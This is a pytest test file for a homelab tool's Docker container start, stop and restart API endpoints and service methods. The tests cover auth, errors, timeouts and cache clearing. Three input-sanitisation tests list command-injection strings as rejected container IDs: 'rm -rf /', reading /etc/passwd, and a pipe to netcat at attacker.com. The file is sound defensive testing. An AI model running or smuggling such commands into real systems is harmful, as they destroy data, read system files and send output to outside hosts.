"""Tests for container action endpoints (US0160, US0161, US0162 - EP0014).

Tests container start, stop, and restart action API endpoints.
"""

from datetime import UTC, datetime
from unittest.mock import AsyncMock, MagicMock

import pytest
from fastapi.testclient import TestClient


def create_server_with_docker(
    client: TestClient,
    auth_headers: dict,
    server_id: str,
    has_docker: bool = True,
) -> None:
    """Helper to create a server with Docker configured via heartbeat."""
    # Create server
    create_resp = client.post(
        "/api/v1/servers",
        json={"id": server_id, "hostname": f"{server_id}.local"},
        headers=auth_headers,
    )
    assert create_resp.status_code == 201, f"Server creation failed: {create_resp.text}"

    # Send heartbeat with docker_installed to set has_docker
    heartbeat_data = {
        "server_id": server_id,
        "hostname": f"{server_id}.local",
        "timestamp": datetime.now(UTC).isoformat(),
        "docker_installed": has_docker,
    }
    hb_resp = client.post(
        "/api/v1/agents/heartbeat",
        json=heartbeat_data,
        headers=auth_headers,
    )
    assert hb_resp.status_code == 200, f"Heartbeat failed: {hb_resp.text}"


class TestContainerStartActionErrorPaths:
    """Tests for container start action API error paths (US0160)."""

    def test_start_container_server_not_found(
        self, client: TestClient, auth_headers: dict
    ):
        """Test starting container on non-existent server returns 404."""
        response = client.post(
            "/api/v1/servers/nonexistent/containers/plex/start",
            headers=auth_headers,
        )

        assert response.status_code == 404
        data = response.json()
        assert data["detail"]["code"] == "NOT_FOUND"

    def test_start_container_no_docker(
        self, client: TestClient, auth_headers: dict
    ):
        """Test starting container on server without Docker returns 400."""
        create_server_with_docker(
            client, auth_headers, "no-docker-host", has_docker=False
        )

        response = client.post(
            "/api/v1/servers/no-docker-host/containers/plex/start",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "DOCKER_NOT_INSTALLED"

    def test_start_container_no_ssh_key(
        self, client: TestClient, auth_headers: dict
    ):
        """Test starting container without SSH key configured returns 400."""
        # Create server with Docker but no SSH key configured
        create_server_with_docker(
            client, auth_headers, "no-tailscale-host", has_docker=True
        )

        response = client.post(
            "/api/v1/servers/no-tailscale-host/containers/plex/start",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "SSH_KEY_NOT_CONFIGURED"

    def test_start_container_requires_auth(
        self, client: TestClient, auth_headers: dict
    ):
        """Test that starting container requires API key."""
        create_server_with_docker(client, auth_headers, "auth-test-host", has_docker=True)

        response = client.post(
            "/api/v1/servers/auth-test-host/containers/plex/start",
            # No auth headers
        )

        assert response.status_code == 401


class TestContainerServiceStartMethod:
    """Unit tests for ContainerService.start_container method."""

    @pytest.mark.asyncio
    async def test_start_container_success(self):
        """Test starting a container successfully."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "plex\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 150
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.start_container(
            server, "plex"
        )

        assert success is True
        assert output == "plex\n"
        assert exit_code == 0
        assert duration == 150
        mock_ssh.execute.assert_called_once()
        call_args = mock_ssh.execute.call_args
        assert "docker start plex" in call_args.kwargs["command"]

    @pytest.mark.asyncio
    async def test_start_container_failure(self):
        """Test starting a container that doesn't exist."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 1
        mock_result.stdout = ""
        mock_result.stderr = "Error: No such container: invalid"
        mock_result.duration_ms = 50
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.start_container(
            server, "invalid"
        )

        assert success is False
        assert "No such container" in output
        assert exit_code == 1

    @pytest.mark.asyncio
    async def test_start_container_sanitises_input(self):
        """Test that container IDs with special characters are rejected."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        # Test various injection attempts
        test_cases = [
            "container;rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 1234",
            "container`id`",
            "container$(whoami)",
        ]

        for malicious_id in test_cases:
            success, output, exit_code, duration = await service.start_container(
                server, malicious_id
            )
            assert success is False
            assert "Invalid container ID format" in output
            # SSH should NOT be called for invalid IDs
            mock_ssh.execute.assert_not_called()

    @pytest.mark.asyncio
    async def test_start_container_valid_ids(self):
        """Test that valid container IDs are accepted."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "container-name\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 100
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        # Valid container IDs
        valid_ids = [
            "plex",
            "my-container",
            "my_container",
            "container123",
            "abc123def456",
            "my-app_v2",
        ]

        for valid_id in valid_ids:
            mock_ssh.execute.reset_mock()
            success, output, exit_code, duration = await service.start_container(
                server, valid_id
            )
            assert success is True
            mock_ssh.execute.assert_called_once()
            call_args = mock_ssh.execute.call_args
            assert f"docker start {valid_id}" in call_args.kwargs["command"]

    @pytest.mark.asyncio
    async def test_start_container_clears_cache(self):
        """Test that starting a container clears the container cache."""
        from homelab_cmd.services.container_service import (
            CachedContainers,
            ContainerService,
            _container_cache,
        )

        # Pre-populate cache
        _container_cache["test-server"] = CachedContainers(
            containers=[{"id": "abc123", "name": "test"}],
            fetched_at=datetime.now(UTC),
        )

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "test\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 100
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        await service.start_container(server, "test")

        # Cache should be cleared
        assert "test-server" not in _container_cache


class TestContainerStopActionErrorPaths:
    """Tests for container stop action API error paths (US0161)."""

    def test_stop_container_server_not_found(
        self, client: TestClient, auth_headers: dict
    ):
        """Test stopping container on non-existent server returns 404."""
        response = client.post(
            "/api/v1/servers/nonexistent/containers/plex/stop",
            headers=auth_headers,
        )

        assert response.status_code == 404
        data = response.json()
        assert data["detail"]["code"] == "NOT_FOUND"

    def test_stop_container_no_docker(
        self, client: TestClient, auth_headers: dict
    ):
        """Test stopping container on server without Docker returns 400."""
        create_server_with_docker(
            client, auth_headers, "no-docker-stop", has_docker=False
        )

        response = client.post(
            "/api/v1/servers/no-docker-stop/containers/plex/stop",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "DOCKER_NOT_INSTALLED"

    def test_stop_container_no_ssh_key(
        self, client: TestClient, auth_headers: dict
    ):
        """Test stopping container without SSH key configured returns 400."""
        create_server_with_docker(
            client, auth_headers, "no-tailscale-stop", has_docker=True
        )

        response = client.post(
            "/api/v1/servers/no-tailscale-stop/containers/plex/stop",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "SSH_KEY_NOT_CONFIGURED"

    def test_stop_container_requires_auth(
        self, client: TestClient, auth_headers: dict
    ):
        """Test that stopping container requires API key."""
        create_server_with_docker(client, auth_headers, "auth-stop-host", has_docker=True)

        response = client.post(
            "/api/v1/servers/auth-stop-host/containers/plex/stop",
            # No auth headers
        )

        assert response.status_code == 401

    def test_stop_container_timeout_parameter(
        self, client: TestClient, auth_headers: dict
    ):
        """Test that timeout parameter is validated (AC3)."""
        create_server_with_docker(client, auth_headers, "timeout-test-host", has_docker=True)

        # Invalid timeout - too low
        response = client.post(
            "/api/v1/servers/timeout-test-host/containers/plex/stop?timeout=0",
            headers=auth_headers,
        )
        assert response.status_code == 422  # Validation error

        # Invalid timeout - too high
        response = client.post(
            "/api/v1/servers/timeout-test-host/containers/plex/stop?timeout=500",
            headers=auth_headers,
        )
        assert response.status_code == 422  # Validation error


class TestContainerServiceStopMethod:
    """Unit tests for ContainerService.stop_container method (US0161)."""

    @pytest.mark.asyncio
    async def test_stop_container_success(self):
        """Test stopping a container successfully."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "plex\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 150
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.stop_container(
            server, "plex"
        )

        assert success is True
        assert output == "plex\n"
        assert exit_code == 0
        assert duration == 150
        mock_ssh.execute.assert_called_once()
        call_args = mock_ssh.execute.call_args
        assert "docker stop -t 10 plex" in call_args.kwargs["command"]

    @pytest.mark.asyncio
    async def test_stop_container_with_custom_timeout(self):
        """Test stopping a container with custom timeout (AC3)."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "plex\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 30150
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.stop_container(
            server, "plex", timeout_seconds=30
        )

        assert success is True
        mock_ssh.execute.assert_called_once()
        call_args = mock_ssh.execute.call_args
        assert "docker stop -t 30 plex" in call_args.kwargs["command"]
        # Timeout should include extra buffer
        assert call_args.kwargs["timeout"] == 60

    @pytest.mark.asyncio
    async def test_stop_container_failure(self):
        """Test stopping a container that doesn't exist."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 1
        mock_result.stdout = ""
        mock_result.stderr = "Error: No such container: invalid"
        mock_result.duration_ms = 50
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.stop_container(
            server, "invalid"
        )

        assert success is False
        assert "No such container" in output
        assert exit_code == 1

    @pytest.mark.asyncio
    async def test_stop_container_sanitises_input(self):
        """Test that container IDs with special characters are rejected."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        # Test various injection attempts
        test_cases = [
            "container;rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 1234",
            "container`id`",
            "container$(whoami)",
        ]

        for malicious_id in test_cases:
            success, output, exit_code, duration = await service.stop_container(
                server, malicious_id
            )
            assert success is False
            assert "Invalid container ID format" in output
            # SSH should NOT be called for invalid IDs
            mock_ssh.execute.assert_not_called()

    @pytest.mark.asyncio
    async def test_stop_container_timeout_bounds(self):
        """Test that timeout is clamped to reasonable bounds."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "plex\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 100
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        # Test timeout too low (should clamp to 1)
        await service.stop_container(server, "plex", timeout_seconds=0)
        call_args = mock_ssh.execute.call_args
        assert "-t 1" in call_args.kwargs["command"]

        mock_ssh.execute.reset_mock()

        # Test timeout too high (should clamp to 300)
        await service.stop_container(server, "plex", timeout_seconds=999)
        call_args = mock_ssh.execute.call_args
        assert "-t 300" in call_args.kwargs["command"]

    @pytest.mark.asyncio
    async def test_stop_container_clears_cache(self):
        """Test that stopping a container clears the container cache."""
        from homelab_cmd.services.container_service import (
            CachedContainers,
            ContainerService,
            _container_cache,
        )

        # Pre-populate cache
        _container_cache["test-stop-cache"] = CachedContainers(
            containers=[{"id": "abc123", "name": "test"}],
            fetched_at=datetime.now(UTC),
        )

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "test\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 100
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-stop-cache"

        await service.stop_container(server, "test")

        # Cache should be cleared
        assert "test-stop-cache" not in _container_cache


class TestContainerRestartActionErrorPaths:
    """Tests for container restart action API error paths (US0162)."""

    def test_restart_container_server_not_found(
        self, client: TestClient, auth_headers: dict
    ):
        """Test restarting container on non-existent server returns 404."""
        response = client.post(
            "/api/v1/servers/nonexistent/containers/plex/restart",
            headers=auth_headers,
        )

        assert response.status_code == 404
        data = response.json()
        assert data["detail"]["code"] == "NOT_FOUND"

    def test_restart_container_no_docker(
        self, client: TestClient, auth_headers: dict
    ):
        """Test restarting container on server without Docker returns 400."""
        create_server_with_docker(
            client, auth_headers, "no-docker-restart", has_docker=False
        )

        response = client.post(
            "/api/v1/servers/no-docker-restart/containers/plex/restart",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "DOCKER_NOT_INSTALLED"

    def test_restart_container_no_ssh_key(
        self, client: TestClient, auth_headers: dict
    ):
        """Test restarting container without SSH key configured returns 400."""
        create_server_with_docker(
            client, auth_headers, "no-tailscale-restart", has_docker=True
        )

        response = client.post(
            "/api/v1/servers/no-tailscale-restart/containers/plex/restart",
            headers=auth_headers,
        )

        assert response.status_code == 400
        data = response.json()
        assert data["detail"]["code"] == "SSH_KEY_NOT_CONFIGURED"

    def test_restart_container_requires_auth(
        self, client: TestClient, auth_headers: dict
    ):
        """Test that restarting container requires API key."""
        create_server_with_docker(client, auth_headers, "auth-restart-host", has_docker=True)

        response = client.post(
            "/api/v1/servers/auth-restart-host/containers/plex/restart",
            # No auth headers
        )

        assert response.status_code == 401


class TestContainerServiceRestartMethod:
    """Unit tests for ContainerService.restart_container method (US0162)."""

    @pytest.mark.asyncio
    async def test_restart_container_success(self):
        """Test restarting a container successfully."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "plex\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 250
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.restart_container(
            server, "plex"
        )

        assert success is True
        assert output == "plex\n"
        assert exit_code == 0
        assert duration == 250
        mock_ssh.execute.assert_called_once()
        call_args = mock_ssh.execute.call_args
        assert "docker restart plex" in call_args.kwargs["command"]

    @pytest.mark.asyncio
    async def test_restart_container_failure(self):
        """Test restarting a container that doesn't exist."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 1
        mock_result.stdout = ""
        mock_result.stderr = "Error: No such container: invalid"
        mock_result.duration_ms = 50
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        success, output, exit_code, duration = await service.restart_container(
            server, "invalid"
        )

        assert success is False
        assert "No such container" in output
        assert exit_code == 1

    @pytest.mark.asyncio
    async def test_restart_container_sanitises_input(self):
        """Test that container IDs with special characters are rejected."""
        from homelab_cmd.services.container_service import ContainerService

        mock_ssh = AsyncMock()
        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-server"

        # Test various injection attempts
        test_cases = [
            "container;rm -rf /",
            "container && cat /etc/passwd",
            "container | nc attacker.com 1234",
            "container`id`",
            "container$(whoami)",
        ]

        for malicious_id in test_cases:
            success, output, exit_code, duration = await service.restart_container(
                server, malicious_id
            )
            assert success is False
            assert "Invalid container ID format" in output
            # SSH should NOT be called for invalid IDs
            mock_ssh.execute.assert_not_called()

    @pytest.mark.asyncio
    async def test_restart_container_clears_cache(self):
        """Test that restarting a container clears the container cache."""
        from homelab_cmd.services.container_service import (
            CachedContainers,
            ContainerService,
            _container_cache,
        )

        # Pre-populate cache
        _container_cache["test-restart-cache"] = CachedContainers(
            containers=[{"id": "abc123", "name": "test"}],
            fetched_at=datetime.now(UTC),
        )

        mock_ssh = AsyncMock()
        mock_result = MagicMock()
        mock_result.exit_code = 0
        mock_result.stdout = "test\n"
        mock_result.stderr = ""
        mock_result.duration_ms = 200
        mock_ssh.execute = AsyncMock(return_value=mock_result)

        service = ContainerService(mock_ssh)

        server = MagicMock()
        server.id = "test-restart-cache"

        await service.restart_container(server, "test")

        # Cache should be cleared
        assert "test-restart-cache" not in _container_cache
